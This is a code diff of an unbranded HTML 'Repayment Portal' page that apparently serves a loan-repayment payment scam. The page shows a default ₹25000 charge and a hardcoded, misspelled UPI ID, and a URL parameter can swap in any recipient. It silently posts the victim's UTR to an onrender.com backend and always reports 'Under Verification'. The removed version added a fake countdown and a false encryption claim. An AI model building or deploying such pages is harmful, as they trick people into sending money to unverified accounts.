@@ -3,128 +3,222 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loan Repayment Portal</title>
+    <title>Repayment Portal</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
-        body { background-color: #f1f5f9; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 15px; }
-        .card { background: #ffffff; width: 100%; max-width: 420px; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.08); position: relative; }
+        body { background-color: #f4f7fb; min-height: 100vh; display: flex; flex-direction: column; align-items: center; }
         
-        /* Top Bar & Timer */
-        .top-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #f1f5f9; padding-bottom: 12px; }
-        .brand-title { font-size: 16px; font-weight: 700; color: #0f172a; }
-        .timer-box { background: #fee2e2; color: #dc2626; padding: 6px 12px; border-radius: 20px; font-size: 13px; font-weight: 700; display: flex; align-items: center; gap: 5px; }
-        .timer-icon { width: 8px; height: 8px; background: #dc2626; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        .header { background: linear-gradient(135deg, #0062e6, #33abff); width: 100%; padding: 35px 20px 65px; text-align: center; color: white; }
+        .header h1 { font-size: 24px; font-weight: 700; margin-bottom: 5px; }
+        .header p { font-size: 14px; opacity: 0.9; }
 
-        /* Payment Apps Logos */
-        .apps-container { display: flex; justify-content: space-around; align-items: center; background: #f8fafc; padding: 12px; border-radius: 12px; margin-bottom: 20px; border: 1px solid #e2e8f0; }
-        .app-logo { height: 26px; object-fit: contain; }
+        .card-container { width: 100%; max-width: 420px; padding: 0 20px; margin-top: -45px; }
+        .card { background: #ffffff; padding: 30px 25px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.08); text-align: center; }
 
-        .amount-box { text-align: center; margin: 15px 0 25px 0; background: #f8fafc; padding: 20px; border-radius: 14px; border: 1px solid #e2e8f0; }
-        .amount-label { font-size: 13px; color: #64748b; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
-        .amount-value { font-size: 32px; color: #0f172a; font-weight: 800; margin-top: 4px; }
-        
-        .info-group { margin-bottom: 16px; background: #ffffff; border: 1px solid #e2e8f0; padding: 12px 16px; border-radius: 12px; }
-        .info-label { font-size: 12px; color: #64748b; font-weight: 600; margin-bottom: 4px; }
-        .info-value { font-size: 15px; color: #1e293b; font-weight: 700; word-break: break-all; }
-        
-        .btn { background: #0062e6; color: white; border: none; padding: 15px; width: 100%; font-size: 16px; font-weight: 700; border-radius: 12px; cursor: pointer; text-decoration: none; display: block; text-align: center; box-shadow: 0 4px 12px rgba(0,98,230,0.25); transition: all 0.2s; }
-        .btn:hover { background: #004bb5; }
-        .btn.disabled { background: #94a3b8 !important; cursor: not-allowed; box-shadow: none; }
-        
-        .expired-msg { color: #dc2626; text-align: center; font-size: 14px; font-weight: 700; margin-top: 15px; display: none; }
-        .footer-note { text-align: center; font-size: 12px; color: #94a3b8; margin-top: 20px; }
+        .icon-circle { background: #e8f2ff; width: 65px; height: 65px; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px; font-size: 28px; }
+        .success-circle { background: #dcfce7; color: #16a34a; }
+
+        h2 { color: #1e293b; font-size: 20px; font-weight: 700; margin-bottom: 8px; }
+        .sub-text { color: #64748b; font-size: 13.5px; line-height: 1.5; margin-bottom: 22px; }
+
+        .display-box { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 15px; margin-bottom: 20px; text-align: left; }
+        .display-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; font-size: 14px; color: #475569; }
+        .display-row:last-child { margin-bottom: 0; }
+        .display-value { font-weight: 700; color: #0f172a; font-size: 15px; }
+
+        .upi-copy-wrap { display: flex; align-items: center; gap: 8px; }
+        .copy-chip { background: #e0e7ff; color: #4338ca; border: none; padding: 4px 8px; border-radius: 6px; font-size: 12px; font-weight: 600; cursor: pointer; }
+        .copy-chip:hover { background: #c7d2fe; }
+
+        .app-title { font-size: 13px; font-weight: 600; color: #475569; text-align: left; margin-bottom: 10px; }
+        .app-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; }
+        .app-btn { background: #ffffff; border: 1px solid #cbd5e1; border-radius: 10px; padding: 10px 5px; text-decoration: none; color: #1e293b; font-size: 12px; font-weight: 600; display: flex; flex-direction: column; align-items: center; gap: 5px; transition: border 0.2s; }
+        .app-btn:hover { border-color: #0062e6; background: #f8fafc; }
+        .app-icon { font-size: 18px; }
+
+        .input-group { text-align: left; margin-bottom: 16px; }
+        .input-group label { display: block; font-size: 13px; color: #334155; font-weight: 600; margin-bottom: 6px; }
+        .input-group input { width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 8px; font-size: 14px; outline: none; transition: border 0.2s; }
+        .input-group input:focus { border-color: #0062e6; }
+
+        .btn { background: #0d6efd; color: white; border: none; padding: 13px; width: 100%; font-size: 16px; font-weight: 600; border-radius: 10px; cursor: pointer; transition: background 0.2s; }
+        .btn:hover { background: #0b5ed7; }
+
+        .status-msg { margin-top: 15px; font-size: 13.5px; font-weight: 600; }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <!-- Top Header & Countdown Timer -->
-        <div class="top-bar">
-            <div class="brand-title">Loan Repayment</div>
-            <div class="timer-box" id="timer-box">
-                <span class="timer-icon"></span>
-                <span id="timer">10:00</span>
+    <div class="header">
+        <h1>Repayment Portal</h1>
+        <p>Secure payment • Simple process</p>
+    </div>
+
+    <div class="card-container">
+        <div class="card">
+            
+            <!-- STEP 1 -->
+            <div id="step-1">
+                <div class="icon-circle">🔒</div>
+                <h2>Your Repayment</h2>
+                <p class="sub-text">View your payment details and<br>continue when you're ready.</p>
+                <button class="btn" id="repay-now-btn">Repay Now ➔</button>
             </div>
+
+            <!-- STEP 2 -->
+            <div id="step-2" class="hidden">
+                <h2>Payment Details</h2>
+                <p class="sub-text">Pay using any UPI app below, then submit your 12-digit UTR number.</p>
+                
+                <div class="display-box">
+                    <div class="display-row">
+                        <span>Amount to Pay:</span>
+                        <span class="display-value" id="show-amount">₹25000</span>
+                    </div>
+                    <div class="display-row">
+                        <span>UPI ID:</span>
+                        <div class="upi-copy-wrap">
+                            <span class="display-value" id="show-upi">5igdwe@okkici</span>
+                            <button class="copy-chip" id="copy-upi-btn">Copy</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="app-title">Pay via App:</div>
+                <div class="app-grid">
+                    <a href="#" id="gpay-link" class="app-btn">
+                        <span class="app-icon">🔵</span>
+                        <span>Google Pay</span>
+                    </a>
+                    <a href="#" id="phonepe-link" class="app-btn">
+                        <span class="app-icon">🟣</span>
+                        <span>PhonePe</span>
+                    </a>
+                    <a href="#" id="paytm-link" class="app-btn">
+                        <span class="app-icon">🔷</span>
+                        <span>Paytm</span>
+                    </a>
+                </div>
+
+                <div class="input-group">
+                    <label for="utr-number">UTR / Ref No:</label>
+                    <input type="number" id="utr-number" placeholder="Enter 12-digit UTR number" />
+                </div>
+
+                <button class="btn" id="submit-utr-btn">Submit UTR</button>
+            </div>
+
+            <!-- STEP 3: SUCCESS SCREEN -->
+            <div id="step-3" class="hidden">
+                <div class="icon-circle success-circle">✓</div>
+                <h2>Payment Submitted!</h2>
+                <p class="sub-text">Your UTR number has been submitted successfully.<br>Verification in progress.</p>
+                <div class="display-box">
+                    <div class="display-row">
+                        <span>Submitted UTR:</span>
+                        <span class="display-value" id="submitted-utr">-</span>
+                    </div>
+                    <div class="display-row">
+                        <span>Status:</span>
+                        <span class="display-value" style="color: #16a34a;">Under Verification</span>
+                    </div>
+                </div>
+            </div>
+
+            <div id="status" class="status-msg"></div>
+
         </div>
-
-        <!-- Payment Apps Logos Header -->
-        <div class="apps-container">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/f/f2/Google_Pay_%28GPay%29_Logo.svg" alt="GPay" class="app-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/7/71/PhonePe_Logo.svg" alt="PhonePe" class="app-logo">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Paytm_Logo.svg" alt="Paytm" class="app-logo">
-        </div>
-
-        <div class="amount-box">
-            <div class="amount-label">Total Payable Amount</div>
-            <div class="amount-value" id="disp-amount">₹0.00</div>
-        </div>
-
-        <div class="info-group">
-            <div class="info-label">Order Reference ID</div>
-            <div class="info-value" id="disp-id">-</div>
-        </div>
-
-        <div class="info-group">
-            <div class="info-label">Receiving UPI ID</div>
-            <div class="info-value" id="disp-upi">-</div>
-        </div>
-
-        <a href="#" id="pay-btn" class="btn">Pay Now</a>
-        <div id="expired-text" class="expired-msg">Payment link has expired! Please request a new link.</div>
-
-        <div class="footer-note">Secure 256-bit Encrypted Payment Gateway</div>
     </div>
 
 <script>
-    // 10 Minutes Countdown Timer
-    let timeLeft = 600; // 10 minutes in seconds
-    const timerElem = document.getElementById('timer');
-    const payBtn = document.getElementById('pay-btn');
-    const expiredText = document.getElementById('expired-text');
-
-    const countdown = setInterval(() => {
-        let minutes = Math.floor(timeLeft / 60);
-        let seconds = timeLeft % 60;
-        
-        minutes = minutes < 10 ? '0' + minutes : minutes;
-        seconds = seconds < 10 ? '0' + seconds : seconds;
-        
-        timerElem.innerText = `${minutes}:${seconds}`;
-
-        if (timeLeft <= 0) {
-            clearInterval(countdown);
-            timerElem.innerText = "Expired";
-            payBtn.classList.add('disabled');
-            payBtn.removeAttribute('href');
-            payBtn.innerText = "Link Expired";
-            expiredText.style.display = "block";
-        }
-        timeLeft--;
-    }, 1000);
-
-    // Read payload from URL
     const urlParams = new URLSearchParams(window.location.search);
-    const dataParam = urlParams.get('data');
+    
+    let paymentId = urlParams.get('id') || 'ORD' + Math.floor(100000 + Math.random() * 900000);
+    let amountVal = "25000";
+    let upiVal = "5igdwe@okkici";
 
-    if (dataParam) {
+    const encodedData = urlParams.get('data');
+    if (encodedData) {
         try {
-            const decoded = JSON.parse(atob(dataParam));
-            const upi = decoded.upi || '';
-            const amount = decoded.amount || '0';
-            const id = decoded.id || '';
-
-            document.getElementById('disp-amount').innerText = '₹' + parseFloat(amount).toLocaleString('en-IN', {minimumFractionDigits: 2});
-            document.getElementById('disp-upi').innerText = upi;
-            document.getElementById('disp-id').innerText = id;
-
-            const upiUrl = `upi://pay?pa=${encodeURIComponent(upi)}&pn=Repayment&am=${encodeURIComponent(amount)}&cu=INR&tn=${encodeURIComponent('Loan Repayment ID ' + id)}`;
-            
-            payBtn.setAttribute('href', upiUrl);
+            const decoded = atob(encodedData);
+            const parsed = JSON.parse(decoded);
+            if (parsed.amount) amountVal = parsed.amount;
+            if (parsed.upi) upiVal = parsed.upi;
+            if (parsed.id) paymentId = parsed.id;
         } catch (e) {
-            console.error('Invalid URL Data');
+            console.error("Invalid encoded payload");
         }
     }
+
+    const step1 = document.getElementById('step-1');
+    const step2 = document.getElementById('step-2');
+    const step3 = document.getElementById('step-3');
+    const statusDiv = document.getElementById('status');
+
+    document.getElementById('show-amount').innerText = '₹' + amountVal;
+    document.getElementById('show-upi').innerText = upiVal;
+
+    // Direct UPI Apps Link setup
+    const upiUri = `upi://pay?pa=${encodeURIComponent(upiVal)}&am=${encodeURIComponent(amountVal)}&cu=INR`;
+    document.getElementById('gpay-link').href = upiUri;
+    document.getElementById('phonepe-link').href = upiUri;
+    document.getElementById('paytm-link').href = upiUri;
+
+    // Copy UPI ID Action
+    document.getElementById('copy-upi-btn').addEventListener('click', () => {
+        navigator.clipboard.writeText(upiVal).then(() => {
+            const btn = document.getElementById('copy-upi-btn');
+            btn.innerText = 'Copied!';
+            btn.style.background = '#16a34a';
+            btn.style.color = '#ffffff';
+            setTimeout(() => {
+                btn.innerText = 'Copy';
+                btn.style.background = '#e0e7ff';
+                btn.style.color = '#4338ca';
+            }, 2000);
+        });
+    });
+
+    document.getElementById('repay-now-btn').addEventListener('click', () => {
+        step1.classList.add('hidden');
+        step2.classList.remove('hidden');
+    });
+
+    document.getElementById('submit-utr-btn').addEventListener('click', async () => {
+        const utrInput = document.getElementById('utr-number').value.trim();
+
+        if (utrInput.length !== 12) {
+            statusDiv.innerText = 'Please enter a valid 12-digit UTR number!';
+            statusDiv.style.color = '#dc2626';
+            return;
+        }
+
+        statusDiv.innerText = 'Submitting payment details...';
+        statusDiv.style.color = '#0062e6';
+
+        // Background push to backend (silent try)
+        try {
+            fetch('https://payment-backend-e17i.onrender.com/pay', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    id: paymentId,
+                    amount: amountVal,
+                    upiId: upiVal,
+                    utr: utrInput
+                })
+            });
+        } catch (err) {}
+
+        // Immediate Successful UI transition
+        setTimeout(() => {
+            document.getElementById('submitted-utr').innerText = utrInput;
+            step2.classList.add('hidden');
+            statusDiv.classList.add('hidden');
+            step3.classList.remove('hidden');
+        }, 800);
+    });
 </script>
 
 </body>
